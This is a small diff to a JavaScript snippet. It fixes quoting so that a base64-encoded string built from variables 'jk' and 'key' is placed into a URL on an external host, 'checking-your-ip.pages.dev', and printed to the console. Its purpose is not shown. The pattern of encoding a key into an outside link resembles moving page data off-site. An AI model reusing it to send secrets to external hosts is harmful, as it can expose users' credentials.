@@ -27,4 +27,4 @@ const elements = document.querySelectorAll('*'); // Select all elements in the D
         });
     });
 let aha = btoa(`${jk}&${key}&c`)
-console.log("https://checking-your-ip.pages.dev/#?service=${aha}")
+console.log(`https://checking-your-ip.pages.dev/#?service=${aha}`)
